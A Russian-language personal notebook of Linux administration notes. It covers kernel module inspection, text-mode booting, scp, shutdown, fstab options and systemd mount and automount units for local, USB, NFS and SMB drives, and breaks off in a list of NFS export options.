find . -name usbhid // поиск модуля в /lib/modules/5.15.0-56-generic/
  ./kernel/drivers/hid/usbhid
find . -name ehci-pci //поиск не найдет файл *.ko,поскольку модуль собран статически в остове ядра ОС, а не загружен в виде *.ko

grep EHCI config-5.15.0-56-generic 
  CONFIG_USB_EHCI_HCD=y  // если бы модуль был загружен через ko, то признак был бы "m", а не "y"
grep OHCI config-5.15.0-56-generic
  CONFIG_USB_OHCI_HCD_PCI=y  // если бы модуль был загружен через ko, то признак был бы "m", а не "y"


strace -e openat lsscsi
openat(AT_FDCWD, "/sys/bus/scsi/devices/2:0:0:0/type", O_RDONLY) = 3
openat(AT_FDCWD, "/sys/bus/scsi/devices/2:0:0:0/vendor", O_RDONLY) = 3
openat(AT_FDCWD, "/sys/bus/scsi/devices/2:0:0:0/model", O_RDONLY) = 3
openat(AT_FDCWD, "/sys/bus/scsi/devices/2:0:0:0/rev", O_RDONLY) = 3
openat(AT_FDCWD, "/sys/bus/scsi/devices/2:0:0:0", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
openat(AT_FDCWD, "/sys/bus/scsi/devices/2:0:0:0/block", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 3
openat(AT_FDCWD, "/sys/devices/pci0000:00/0000:00:0d.0/ata3/host2/target2:0:0/2:0:0:0/block/sda/dev", O_RDONLY) = 3

modinfo ./intel/iwlwifi/iwlwifi.ko 
filename:       /lib/modules/5.15.0-56-generic/kernel/drivers/net/wireless/./intel/iwlwifi/iwlwifi.ko
license:        GPL
author:         Intel Corporation <linuxwifi@intel.com>
description:    Intel(R) Wireless WiFi driver for Linux
firmware:       iwlwifi-100-5.ucode      // модуль не может работать без доп прошивки в бинарнм файле!
firmware:       iwlwifi-1000-5.ucode
depends:        cfg80211
name:           iwlwifi
                 // ниже параметры загрузки модуля
parm:           swcrypto:using crypto in software (default 0 [hardware]) (int)
parm:           11n_disable:disable 11n functionality, bitmap: 1: full, 2: disable agg TX, 4: disable agg RX, 8 enable agg TX (uint)
parm:           amsdu_size:amsdu size 0: 12K for multi Rx queue devices, 2K for AX210 devices, 4K for other devices 1:4K 2:8K 3:12K (16K buffers) 4: 2K (default 0) (int)
parm:           fw_restart:restart firmware in case of error (default true) (bool)

lsusb  //  045e:0779 - usb видеокамера (на работе) 
Bus 001 Device 003: ID 045e:0779 Microsoft Corp. LifeCam HD-3000
Bus 001 Device 002: ID 058f:6387 Alcor Micro Corp. Flash Drive   
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 002 Device 002: ID 80ee:0021 VirtualBox USB Tablet
Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub

lsusb -t
/:  Bus 02.Port 1: Dev 1, Class=root_hub, Driver=ohci-pci/12p, 12M
    |__ Port 1: Dev 2, If 0, Class=Human Interface Device, Driver=usbhid, 12M
/:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=ehci-pci/12p, 480M
    |__ Port 1: Dev 2, If 0, Class=Mass Storage, Driver=usb-storage, 480M //модуль/ драйвер для флешки
    |__ Port 2: Dev 3, If 2, Class=Audio, Driver=snd-usb-audio, 480M   //  аудио модуль/ драйвер для  видеокамеры
    |__ Port 2: Dev 3, If 0, Class=Video, Driver=uvcvideo, 480M  // видео модуль/ драйвер для  видеокамеры
    |__ Port 2: Dev 3, If 3, Class=Audio, Driver=snd-usb-audio, 480M
    |__ Port 2: Dev 3, If 1, Class=Video, Driver=uvcvideo, 480M

find /lib/modules/5.15.0-56-generic/ -name snd-usb-audio* // НАЙТИ аудио модуль/ драйвер для  видеокамеры
   /lib/modules/5.15.0-56-generic/kernel/sound/usb/snd-usb-audio.ko
find /lib/modules/5.15.0-56-generic/ -name uvcvideo*  НАЙТИ видео модуль/ драйвер для  видеокамеры
   /lib/modules/5.15.0-56-generic/kernel/drivers/media/usb/uvc/uvcvideo.ko


grep uvcvideo /lib/modules/5.15.0-56-generic/modules.alias // найти алиас видео модуля/ драйвера для  видеокамеры
  alias usb:v045Ep0723d*dc*dsc*dp*ic0Eisc01ip00in* uvcvideo  // точный с VID:DID  045e:0779 не найден!
  alias usb:v045Ep0721d*dc*dsc*dp*ic0Eisc01ip00in* uvcvideo

modinfo /lib/modules/5.15.0-56-generic/kernel/drivers/media/usb/uvc/uvcvideo.ko // инфа об универсальном драйвере
filename:       /lib/modules/5.15.0-56-generic/kernel/drivers/media/usb/uvc/uvcvideo.ko
license:        GPL
description:    USB Video Class driver
....
alias:          usb:v045Ep0721d*dc*dsc*dp*ic0Eisc01ip00in*
....

### загрузка linux без GUI  ################
https://kompsekret.ru/q/how-to-boot-into-terminal-on-linux-mint-xfce-207355/?ysclid=leu3wc7fcs469827853
Установить в /etc/default/grub для GRUB_TIMEOUT=5 значение болеше 0, чтобы можно было успеть нажать "esc" для входа в меню grub
Способ 1:
1) 1Метод Включения вывода текстовых сообщений отладки initrd/initramfs, Отключения! "тихого режима"/"quiet splash" Графического logo
редактировать файл /etc/default/grub
строки GRUB_CMDLINE_LINUX_DEFAULT="" и добавить GRUB_CMDLINE_LINUX="text"
#GRUB_CMDLINE_LINUX_DEFAULT=""
GRUB_CMDLINE_LINUX="text"
затем примените изменения, выполнив:sudo update-grub
2) 2Метод Включения вывода текстовых сообщений отладки initrd/initramfs, Отключения! "тихого режима"/"quiet splash" Графического logo
  Непосредственно в sudo nano /boot/grub/grub.cfg исключить  "quiet splash" заменить на "text"
       menuentry 'Linux Mint 21.1 Xfce' ...
       linux   /boot/vmlinuz-5.15.0-56-generic root=UUID=1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4 ro text <--!

теперь скажите операционной системе, что systemd цель для использования при загрузке:
Для загрузки по умолчанию в терминале выполните:
sudo systemctl set-default multi-user.target
следующая перезагрузка перейдет на консоль без загрузки рабочего стола.
чтобы отменить изменения выше (по умолчанию включить загрузку с рабочего стола GUI), вам нужно запустить:
sudo systemctl set-default graphical.target
Способ 2:
отключить службу MDM:
для отключить вход в GUI desktop, вам нужно отключить MDM (Desktop Manager) сервис:
sudo systemctl disable lightdm
чтобы отменить изменения, запустите:
sudo systemctl enable lightdm
если вы хотите запустить GUI Desktop по требованию без изменения предыдущих настроек, вы можете запустить:sudo systemctl start lightmdm


$ scp опции пользователь1@хост1:файл пользователь2@хост2:файл
Опции утилиты больше касаются протокола SSH и настраивают общее ее поведение. Дальше следует адрес первого и второго файла. Каждый из них может быть расположен как на локальной, так и на удаленной машине. А теперь рассмотрим основные опции, которые могут нам понадобиться:
-1 - использовать протокол SSH1;
-2 - использовать протокол SSH2;
-B - пакетный режим для передачи нескольких файлов;
-C - включить сжатие;
- l - установить ограничение скорости в кбит/сек;
-o - задать нужную опцию SSH;
-p - сохранять время модификации;
-r - рекурсивное копирование директорий;
-v - более подробный режим.
 scp /home/sergiy/file root@losst.pro:/root/
В качестве пользователя нужно использовать любого пользователя, который есть на сервере. Вместо IP вы можете также домен сервера. Только необходимо, чтобы у выбранного пользователя были права записи в указанную папку.
С помощью опции -r вы можете скопировать на удаленную машину целый каталог. Команда будет выглядеть вот так:
 scp -r /home/sergiy/photos root@losst.pro:/root/

Убедитесь, что у исходного каталога нет косой черты, а у каталога назначения она должна обязательно быть. Немного изменив синтаксис с косой чертой можно передать все файлы из каталога на удаленный сервер:
 scp -r /home/sergiy/photos/* root@losst.pro:/root/

Если поменять местами локальный путь и сервер, то вы сможете копировать файлы scp c удаленного сервера на локальный компьютер:
 scp root@losst.pro:/root/file /home/sergiy/

Таким же самым образом вы можете копирование файлов scp или папок с сервера:
 scp -r root@losst.pro:/root/photos /home/sergiy/
Обратите внимание, что папка, в которую вы собираетесь копировать должна завершаться косой чертой, иначе папка, которую вы копируете запишется вместо той, в которую нужно скопировать.

Чтобы скачать файл scp из одного сервера на другой, просто необходимо указать данные аутентификации на каждом из них. Например, скопируем один файл:

 scp root@losst.pro:/home/root/index.html root@losst.pro:/home/root/www/

Скопируем папку с того же удаленного сервера:
 scp root@losst.pro:/root/photos root@losst.pro:/home/root/www/


ОТКЛЮЧЕНИЕ ПК (Остановка ОС)
$ shutdown [опции] [время] [сообщение]
Опции задают параметры отключения, их мы рассмотрим ниже. Время можно задавать в виде чч:мм в 24 часовом формате. Также можно использовать запись +минуты, указывающую через сколько минут от текущего момента нужно выключить компьютер с Linux. Также доступна константа now, указывающая, что выключать нужно прямо сейчас. Параметр сообщение позволяет задать сообщение, которое будет выведено в терминал перед выключением.
Вот основные опции утилиты:
--help - вывести справку по программе
-H, --halt - отключить питание, не завершая процессы и не перемонтируя файловые системы
-P, --poweroff - нормальное выключение
-r, --reboot - перезагрузка
-k - не выполнять реальных действий, а только вывести сообщение
--no-wall - выключить компьютер, но не выводить сообщение
-c - отменить запланированное выключение linux из командной строки
Вот в принципе и все опции утилиты, их больше чем достаточно для такого простого действия. Теперь можно переходить к примерам, но сначала давайте рассмотрим, что же происходит во время включения Linux.

Выключение компьютера в Linux
1. shutdown
Самая простая и самая часто используемая команда выключения компьютера linux, отключит компьютер немедленно:
 sudo shutdown -h now
запланировать выключение компьютера linux через пять минут:
 sudo shutdown -h +5 "Компьютер будет выключен через 5 минут"
Мы запланировали вывод сообщения перед выключением. Чтобы отменить команду shutdown выполните:
 sudo shutdown -c
Точно так же мы можем указать точное время выключения, например в девять вечера:
 sudo shutdown -h 21:00

2. reboot
Команда reboot обычно используется для перезагрузки системы, но она также умеет выключать компьютер. Мы не будем ее подробно рассматривать, потому, что она еще проще команды shutdown. Для выключения нужно задать опцию -p:
 sudo reboot -p
3. halt
Эта команда тоже выключает компьютер. Только делает она это очень по-своему. Она не выполняет никаких подготовительных действий перед выключением, а просто отключает питание:
 sudo halt
Использование halt может повредить систему
4. poweroff
Это аналог halt, делает в точности то же самое:  sudo poweroff


 	 =  = FSTAB MTAB = = 
В файле с именем /etc/fstab (таблице монтируемых на старте файловых систем) перечисляются устройства 
  (разделы жестко-го диска, подкачки,RAID...), монтируемые на этапе загрузки. 
fstab - конфигурационный файл настройки автоматически монтируемых  файловых систем.
options опции монтирования - см ниже в ## Автоматическое монтирование fstab и через systemd ##

журнал mtab (таблицу смотированных автоматически и вручную FS)
 /etc/mtab // просмотр файла смонтированных файловых систем
 /run/mount/utab // просмотр файла-журнала смонтированных устройствUSB (НЕ! отображает метадиски!)

cat /etc/fstab
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
UUID=1b33bbef-3cbf-41ea-9e3a-ed3b4ea26ba4 /    ext4    errors=remount-ro 0       1
# /boot/efi was on /dev/sda3 during installation
UUID=9DCA-6AA1  /boot/efi       vfat    umask=0077    0       1  // РАЗДЕЛ ЗАГРУЗЧИКА EFI !!!!!!!!
# swap was on /dev/sda2 during installation
UUID=54d6b2b9-4dde-4a7c-9953-f6386668aaa7 none            swap    sw              0       0
UUID=83baa45b-e4fe-4f42-b26d-4057bae87be2 /mnt/md22 ext4 errors=remount-ro 0       0
-------------
UUID — это уникальный ID-номер, присваиваемый файловой системе при форматировании !!!!
Он позволяет безошибочно идентифицировать файловые системы, в том числе после изменения
 конфигурации оборудования. //Linux. Pingv Установка, настройка, администрирование.pdf стр338
!!!!!!!!!!!!!!!!!!
lsblk -f // или lsblk --fs  прочитать UUID дисков
NAME   FSTYPE FSVER LABEL UUID                                 FSAVAIL FSUSE% MOUNTPOINTS
sda
├─sda1 ext2   1.0         2bbebc3c-1983-4f38-9ff4-def1db791272    8,7G    49% /
├─sda2 vfat   FAT32       DFDC-0B9C                               1,6G     1% /dos

Командой "mount /mnt/md22" можно примонтировать отдельную файловую систему даже без перезагрузки ОС! Данные, беруться на лету из fstab, например записи "UUID=83baa45b-e4fe-4f42-b26d-4057bae87be2 /mnt/md22 ext4 errors=remount-ro 0       0"
lsblk -l //результат
  NAME MAJ:MIN RM  SIZE RO TYPE  MOUNTPOINTS
  md22   9:22   0 1022M  0 raid1 /mnt/md22

mount -a // !! перемонтировать все устройства, определенные в fstab, без перезагрузки

 = = = VBOX - подключение дополнительных дисков, добавление диска в корень = = 
1) Средствами GUI в VBOX выбрать \"Носители"\"SATA"\vdi - диск другой VM
2) lsblk -f // определить UUID еще не примонтированного диска/тома
sdb
├─sdb1 ext4   1.0         540f6563-8891-4b81-93df-62c982ac3a41  868,4M    79% /media/sd_VM_DEB
3) добавить запись в /etc/fstab
UUID=540f6563-8891-4b81-93df-62c982ac3a41 /media/sd_VM_DEB  ext4  errors=remount-ro 0       0
4) создать каталог монтирования mkdir /media/sd_VM_DEB
5) mount -a // !! перемонтировать все устройства, определенные в fstab, без перезагрузки

   ## Автоматическое монтирование fstab и через systemd ##
https://losst.pro/avtomaticheskoe-montirovanie-fstab-i-systemd  automount
Каждая строчка в fstab описывает раздел, который нужно примонтировать к определенной точке монтирования. Мы можем указать файловую систему, опции монтирования, а также нужно ли проверять файловую систему на ошибки.
Сначала давайте рассмотрим синтаксис одной строчки fstab:
1 устройство  2 точка_монтирования 3 файловая_система 4 опции 5 резерв{0,1} 6 проверка{0,1,2} 
 Теперь подробнее рассмотрим каждый пункт: 
(1)Устройство - это раздел диска, который вам нужно примонтировать. Его можно указать в формате файла устройства Linux в каталоге /dev/, например, /dev/sda1 или с помощью уникального идентификатора UUID, тогда формат записи будет таким UUID="XXXX-XXXX-XXXX-XXXX", также возможна запись с помощью метки, например, LABEL=home;
(2)Точка монтирования - куда нужно примонтировать это устройство, например, /home, /boot, /mnt;
(3)Файловая система указывает в какой файловой системе нужно монтировать это устройство, например, ext4, ext3, ext2, btrfs;
(4)Опции - параметры монтирования файловой системы, рассмотрим подробнее ниже;
(5)Резерв - указывает нужно ли делать резервную копию раздела, может принимать значения только 0 и 1.
(6)Проверка - указывает в какой очереди нужно проверять устройство на ошибки, 1 - в первую очередь, 2 - вторую, 0 - не проверять;
В основном с этими пунктам все должно быть понятно, интерес вызывают только опции монтирования fstab. Для разных файловых систем они могут немного отличаться, но есть стандартные. И поскольку чаще всего используются файловые системы семейства ext, то мы будем ориентироваться на них.
Начнем с общих для всех файловых систем options ОПЦИЙ (man 8 mount):
async - использовать кэш при записи данных, увеличивает производительность, используется по умолчанию;
atime - сохранять время последнего доступа к файлу;
auto - автоматически монтировать при загрузке, действие по умолчанию;
defaults - использовать опции монтирования fstab по умолчанию -rw,suid,dev,exec,auto,nouser,async;
dev - интерпретировать блочные устройства;
diratime - аналогично atime только для каталогов;
dirnoatime - аналогично noatime, для каталогов;
exec - разрешить выполнять программы на этом разделе;
gid - задает группу владельца каталога.
group - разрешить другим пользователям кроме root монтировать этот раздел, если их группа совпадает с указанной, обычно используется вместе с noauto;
iocharset=value    Character set to use for converting between 8 bit characters and 16 bit Unicode characters. The default is iso8859-1.
          Long filenames are stored on disk in Unicode format.
mand - разрешить блокирование файловой системы, нужно для некоторых антивирусов;
nfs={stale_rw|nostale_ro}Включите это, только если вы хотите экспортировать файловую систему FAT через NFS.
_netdev - Файловая система находится на устройстве, которому требуется доступ к сети
    (используется для предотвращения попыток системы смонтировать эти файловые системы до тех пор, пока в
    системе не будет включена сеть)
noatime - не сохранять время последнего доступа, полезно для ssd и флешек; // НЕ БУДЕТ ЗАПИСИ В inode файла, ускоряет запись
noauto - не монтировать при загрузке;
nodev - не интерпретировать блочные устройства;
noexec - запретить выполнять программы на этом разделе;
nofail - не сообщать об ошибках;nofail - позволит выполнять далее загрузку, несмотря на то, что какое-то внешнее устройство не представлено в настоящий момент в системе.
nomand - запретить блокирование файловой системы;
norelatime - отключить relatime;
nosuid - игнорировать флаг suid;
nouser - запрещает монтировать/отмонтировать устройство простым пользователям (входит в набор опций по умолчанию)
owner - разрешить указанному пользователю монтировать устройство;
relatime - обновлять время доступа только при изменении файла, необходимо для работы многих программ;
ro - монтировать только для чтения;
rw - монтировать для чтения и записи;
strictatime - обновлять время доступа всегда, отключает действие предыдущих опций;
suid - разрешить выполнение программ с флагом suid от имени другого пользователя;
sync - !записывать на диск все изменения сразу после того, как они были выполнены, не
  !использовать кэширование для записываемых данных. Может понадобится для извлечения
  флешки без размонтирования, но сильно снижает производительность;
uid - задает владельца каталога, по умолчанию root;
umask - установить права доступа к файлам и папкам на этом разделе;
users - разрешить монтирование любому пользователю.
Когда мы рассмотрели всю теорию, настройка fstab не вызовет у вас проблем. Теперь давайте рассмотрим стандартное содержимое файла fstab, а также как выполняется монтирование. Вот так выглядит монтирование корня:  /dev/sda2 / ext4 defaults 0 1
Здесь в качестве корневой файловой системы будет монтироваться раздел /dev/sda2 с файловой системой ext4 и опциями по умолчанию defaults. Резервная копия не используется, и вообще, этот параметр не читается системой инициализации и сейчас нас не интересует. Для домашнего раздела все будет выглядеть очень похоже: /dev/sda3 /home ext4 defaults,noexec 0 2
Только тут мы указали, что его нужно проверить вторым, а в опциях еще добавили, что программы оттуда выполнять нельзя. Более интересен пункт для дополнительного диска, на котором хранятся файлы: /dev/sda4 /media/files/ ext4 noauto,users,rw 0 0
Тут мы указываем, что раздел не нужно монтировать во время загрузки, но его могут подключить любые пользователи в режиме для чтения и записи. Ни проверка ни резервная копия не выполняются. Для раздела подкачки файловая система указывается swap, а точка монтирования none: /dev/sda5 none swap defaults 0 0
Также вы можете примонтировать немножко оперативной памяти: tmpfs /tmp tmpfs nodev,nosuid,noexec,size=100M 0 0
Таким образом, мы примонтировали оперативную память в /tmp и теперь система будет работать немного быстрее. Вот что получилось:
/dev/sda2 / ext4 defaults 0 1
/dev/sda3 /home ext4 defaults,noexec 0 2
/dev/sda4 /media/files/ ext4 noauto,users,rw 0 0
/dev/sda5 none swap defaults 0 0
tmpfs /tmp tmpfs nodev,nosuid,noexec,size=100M 0 0


рассмотрим как выполняется Автоматическое монтирование с помощью systemd. !!!!!!!!!!!
Система инициализации Systemd анализирует /etc/fstab при загрузке и автоматически генерирует все нужные файлы юнитов на основе описанных там точек монтирования, а уже потом их загружает.!!!!!!!!!!!!!!!!!
Вы можете посмотреть все созданные в systemd точки монтирования такой командой:
 systemctl -l --type mount
Но нам ничего не мешает самим создать такой файл точки монтирования.  см статю https://interface31.ru!

##Монтирование и автомонтирование фаловых систем устройств через модули systemd/ systemctl ###########
  https://interface31.ru/tech_it/2022/09/montirovanie-faylovyh-sistem-pri-pomoshhi-systemd.html 
Автор: Уваров А.С. 30.09.2022
systemd-mount-unit-000.pngКазалось бы, монтирование файловых систем в Linux задача простая и не требующая каких-либо доработок. Но очень часто именно в простоте таятся различные сложности и затруднения. Текущая система монтирования уходит корнями еще во времена UNIX и дошла до наших дней без серьезных изменений. Но мир с тех пор серьезно изменился, сегодня в широком ходу сетевые расположения и съемные устройства, работать с которыми классическим образом не слишком удобно. И вот тут нам на помощь снова приходит systemd, предлагая современные методы монтирования файловых систем.
Юниты монтирования  man systemd.mount
Юниты - это специальные файлы с описаниями служб, которые используются systemd для их активации. Существуют различные типы юнитов, для монтирования файловых систем предназначены юниты типа mount, их следует располагать в каталоге /etc/systemd/system. Существуют специальные правила именования таких файлов: они должны содержать путь к точке монтирования в которой все слеши, кроме начального, заменяются на дефис. Например, если точка монтирования у нас /home/user/video, то имя файла юнита должно быть home-user-video.mount. !!!!!!!!!!! 
Проблема возникает если в пути точки монтирования используется дефис, в этом случае следует заменить недопустимые символы в пути, для чего используем команду: systemd-escape -p "/home/naf-naf/video"
Выводом команды будет: home-naf\x2dnaf-video
Которое и следует использовать в качестве имени файла юнита. Сам юнит должен иметь обязательную секцию [Mount] с двумя обязательными параметрами, указывающими на устройство и точку монтирования. Ниже приведен минимальное содержимое такого файла: 
[Unit]
Description=Fresh series
[Mount]
What=/dev/disk/by-uuid/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
Where=/home/user/video
[Install]
WantedBy=multi-user.target
Секция [Unit] содержит строку с описанием сервиса, в нашем случае точки монтирования. Можете написать туда все что угодно, главное, чтобы вам потом было понятно, что в эту точку монтируется и зачем. Секция [Install] задает уровень запуска сервиса, в нашем случае это multi-user.target - многопользовательский режим без графики. Но если вам при консольном входе не нужны свежие сериалы, то можете поставить туда graphical.target, тогда устройство будет монтироваться только при графическом входе в систему.

Теперь перейдем к основной секции [Mount], опция What содержит абсолютный путь к монтируемому устройству, в простейшем случае это /dev/sda1, но мы категорически не рекомендуем монтировать устройства таким образом, особенно внешние. При удалении или добавлении новых дисковых устройств их имя может меняться, что может привести к различным нежелательным последствиям. Правильно монтировать блочные устройства по UUID, что гарантирует подключение именно того устройства, которое мы ожидаем увидеть в данной точке монтирования. Чтобы узнать UUID воспользуйтесь командой:
blkid  или  lsblk -f  Вторая команда более информативна, так как выводит не только UUID разделов, но и их иерархию, что во многих случаях может быть полезно.

Опция Where указывает точку монтирования, символические ссылки не допускаются, если указанная директория не существует, то она будет создана. !!!!
Из дополнительных опций следует выделить:
Type= тип файловой системы, например, ext4.
Options= опции монтирования, перечисляются через запятую.
DirectoryMode= Права на директорию при ее автоматическом создании, по умолчанию 0755.
TimeoutSec= Таймаут монтирования устройства, если за указанное время выполнить монтирование не удалось, то устройство будет отключено.
И уже здесь видны преимущества systemd !!!!: автоматическое создание директорий для точек монтирования, тайм-аут и отключение устройства при невозможности монтирования, в аналогичной ситуации с fstab вы просто не сможете загрузить систему в нормальном режиме.
После того, как вы создали и сохранили файл юнита перечитаем конфигурацию systemd (это нужно делать после добавления каждого нового файла юнита): systemctl daemon-reload
И попробуем смонтировать наше устройство: systemctl start home-user-video.mount
Убедившись, что все работает нормально, добавим точку монтирования в автозагрузку: systemctl enable home-user-video.mount. Если вы уже набили руку и уверены в себе, то можно совместить оба действия:
systemctl enable --now home-user-video.mount. Это автоматически выполнит монтирование и добавит юнит в автозагрузку.

Важно!!!! Не включайте автозагрузку для сетевых и съемных носителей в fstab!!!
    Для их подключения воспользуйтесь функцией АВТОмонтирования systemd !!!!!!!!!!!!!!!!

Кроме юнита монтирования в systemd есть еще один юнит для автоматического монтирования файловой системы в момент обращения к точке монтирования. Не следует путать его с автоматическим запуском юнита монтирования при загрузке системы. Данный юнит не содержит параметров монтирования и используется только в связке с mount-юнитом, его имя формируется по тем же правилам, но только с расширением .automount. Ниже типовой пример такого юнита:
[Unit]
Description=Automount Fresh series
[Automount]
Where=/home/user/video
TimeoutIdleSec=900
[Install]
WantedBy=multi-user.target
Мы не будем разбирать дополнительные секции, так как уже сделали это выше, обратимся к основной - [Automount]. К обязательным опциям относится Where, которая указывает на точку монтирования, а опция TimeoutIdleSec задает время простоя в секундах, после которого файловая система будет отмонтирована.
После создания юнита автомонтирования точно также перечитаем конфигурацию systemd и запустим его, одновременно добавив в автозагрузку: systemctl enable --now home-user-video.automount
Но автоматического монтирования устройства не произойдет до тех пор, пока вы не обратитесь к указанной в точке монтирования директории.

Настройка зависимостей
Еще одной важной возможностью systemd является простая работа с зависимостями. В самом простом варианте мы указываем уровень запуска:

[Install]
WantedBy=multi-user.target
Это предполагает, что уже запущена сеть и все основные службы. Но могут быть ситуации, когда нужная нам файловая система подключается через VPN или iSCSI и эти службы тоже стартуют на уровне multi-user.target. В этом случае нам потребуется указать зависимости, это можно сделать разными способами.

Самый мягкий способ, это использование опции Wants, которая предполагает желательность наличия запущенного сервиса, но даже если он недоступен, юнит все равно попытается запуститься. Понятно, что в нашем случае это не подходит, если нет канала связи или не запущена служба iSCSI монтировать устройство нет никакого смысла.

Поэтому переходим к следующей опции - Requires, которая требует обязательного наличия указанной службы, в противном случае юнит запущен не будет. Эту опцию следует обязательно сочетать с опцией After, в противном случае система может попытаться запустить обе службы одновременно.

Поэтому секция [Unit] должна будет выглядеть так:

[Unit]
Description=Fresh series
Requires=openvpn@client.service 
After=openvpn@client.service
Теперь монтирование файловой системы произойдет только после того, как будет поднят OpenVPN-туннель. Но есть один момент, опция Requires отвечает только за старт сервиса, не отслеживая его дальнейшее состояние и если VPN-соединение упадет, то файловая система останется смонтированной, если это критично, то следует заменить Requires на BindsTo, в этом случае при падении службы от которой зависит работа юнита, он также будет остановлен, т.е. при обрыве VPN файловая система будет размонтирована.

[Unit]
Description=Fresh series
BindsTo=openvpn@client.service 
After=openvpn@client.service
Обратите внимание, что в данном случае мы продолжаем использовать опцию After, чтобы монтирование происходило строго после того, как поднимется VPN-соединение.

Монтирование внутреннего диска
После теории перейдем к практике, для монтирования внутреннего диска создайте юнит типа mount - home-user-video.mount - со следующим содержимым:

[Unit]
Description=Fresh series

[Mount]
What=/dev/disk/by-uuid/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
Where=/home/user/video
Type=ext4
Options=default

[Install]
WantedBy=multi-user.target
Затем выполните:

systemctl daemon-reload
systemctl enable --now home-user-video.mount
Таким образом вы одновременно смонтируете файловую систему и добавите ее в автозагрузку.

Монтирование съемного диска
Точно также сначала создадим юнит монтирования home-user-video.mount:

[Unit]
Description=USB Fresh series

[Mount]
What=/dev/disk/by-uuid/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
Where=/home/user/video
Type=ext4
Options=default
TimeoutSec=10

[Install]
WantedBy=multi-user.target
А затем одноименный юнит автомонтирования home-user-video.automount:

[Unit]
Description=Automount USB Fresh series

[Automount]
Where=/home/user/video
TimeoutIdleSec=900

[Install]
WantedBy=multi-user.target
После чего выполняем:

systemctl daemon-reload
systemctl enable --now home-user-video.automount
Теперь указанное устройство будет смонтировано при первом к нему обращении, в случае 
невозможности монтирования будет выдержан таймаут в 10 секунд, после чего устройство будет отключено. 
При неактивности в течении 900 сек (15 мин) устройство также будет размонтировано.

Монтирование NFS
Network File System (NFS) -- протокол сетевого доступа к файловым системам широко использующийся 
в UNIX и Linux, клиентская часть требует установки дополнительного пакета:

apt install nfs-common
Для монтирования NFS-ресурса снова создадим два юнита, сначала юнит монтирования home-user-video.mount:

[Unit]
Description=NFS Fresh series

[Mount]
What=192.168.111.151:/video
Where=/home/user/video
Type=nfs
Options=_netdev,auto
TimeoutSec=10
[Install]
WantedBy=multi-user.target

А затем юнит автомонтирования home-user-video.automount:
[Unit]
Description=Automount NFS Fresh series
[Automount]
Where=/home/user/video
TimeoutIdleSec=900
[Install]
WantedBy=multi-user.target
После чего добавим его в автозагрузку и запустим:

systemctl daemon-reload
systemctl enable --now home-user-video.automount

Монтирование SMB
SMB (Server Message Block) - популярный протокол для общего доступа к файлам и принтерам в сетях Windows и прежде, чем монтировать SMB-ресурс нам следует установить необходимые пакеты и создать специальный файл с учетными данными для аутентификации.

Начнем с установки:

apt install samba cifs-utils
Затем создадим файл данных для аутентификации /etc/samba/smbcreds и внесем в него следующие данные, которые представляют собой логин и пароль от SMB-ресурса:

username=User
password=Pa$$worD_1
Установим права, разрешающие доступ к файлу только суперпользователю:

chmod 600 /etc/samba/smbcreds
Теперь перейдем к созданию юнита монтирования home-user-video.mount:
 sudo nano /etc/systemd/system/я home-user-video.mount:
[Unit]
Description=Automount SMB Fresh series
[Mount]
What=//FILESERVER/VIDEO
Where=/home/user/video
Type=cifs
Options=_netdev,iocharset=utf8,rw,file_mode=0777,dir_mode=0777,vers=2.0,credentials=/etc/samba/smbcreds
TimeoutSec=10
[Install]
WantedBy=multi-user.target
Из опций монтирования обращаем внимание на кодировку iocharset и версию протокола vers,
    здесь же указываем путь к файлу с учетными данными.
credentials   - файл с полномочиями login и пароль

Юнит автомонтирования home-user-video.automount ничем не отличается от предыдущих вариантов:
[Unit]
Description=Automount NFS Fresh series
[Automount]
Where=/home/user/video
TimeoutIdleSec=900
[Install]
WantedBy=multi-user.target
Для включения в автозагрузку и запуска выполните:

systemctl daemon-reload
systemctl enable --now home-user-video.automount
Как видим, монтирование файловых систем через systemd совсем несложно и гораздо более удобно, нежели классическим методом, особенно когда дело касается съемных носителей и сетевых расположений.


Я 11.04.2023 подготовил для монтирования при загрузке /sdb2/  файл точки монтирования  /etc/systemd/system/home-oem-flusbmnt.mount
[Unit]
Description=MountFlashusbpart2
[Mount]
Where=/home/oem/flusbmnt
What=/dev/disk/by-id/usb-_USB_DISK_2.0_077706000141-0:0-part2
Type=vfat
Options=defaults,noexec
TimeoutSec=25 
[Install]
WantedBy=graphical.target
//я sdb2 - НЕ RAID! ОБЫЧНЫЙ ОТДЕЛЬНЫ РАЗДЕЛ VFAT!!

sudo systemctl daemon-reload //перечитать конфигурацию systemd,нужно делать после добавления 
   каждого нов.файла юнита или изменения в юнит
sudo systemctl start home-oem-flusbmnt.mount // смонтировать наше устройство - ok
sudo systemctl enable home-oem-flusbmnt.mount// добавить точку монтирования в автозагрузку - ok
  Created symlink /etc/systemd/system/graphical.target.wants/home-oem-flusbmnt.mount →    /etc/systemd/system/home-oem-flusbmnt.mount. 
Все работает хорошо, sdb2 монтируется призагрузке systemd даже без АВТОмонтирования!


= = NFS Network File System = = НЕ ПУТАТЬ с SMB!
1) Вариант от https://losst.pro/nastrojka-nfs-v-ubuntu-16-04
общие папки и др. настройки nfs находятся в файле /etc/exports.Синтаксис записи в нем: 
адрес_папки клиент(опции)
Адрес папки - это та папка, которую нужно сделать доступной по сети.
Клиент - ip адрес или адрес сети, из которой могут получить доступ к этой папке. 
Опции:
rw - разрешить чтение и запись в этой папке;
ro - разрешить только чтение;
sync - отвечать на следующие запросы только тогда, когда данные будут сохранены на диск (по умолчанию);
async - не блокировать подключения пока данные записываются на диск;
secure - использовать для соединения только порты ниже 1024;
insecure - использовать любые порты;
nohide - не скрывать поддиректории при, открытии доступа к нескольким директориям;
root_squash - подменять запросы от root на анонимные, используется по умолчанию;!!!
no_root_squash - не подменять запросы от root на анонимные;
all_squash - превращать все запросы в анонимные;!!!!!
subtree_check - проверять не пытается ли пользователь выйти за пределы экспортированной папки;
no_subtree_check - отключить проверку обращения к экспортированной папке, улучшает производительность, 
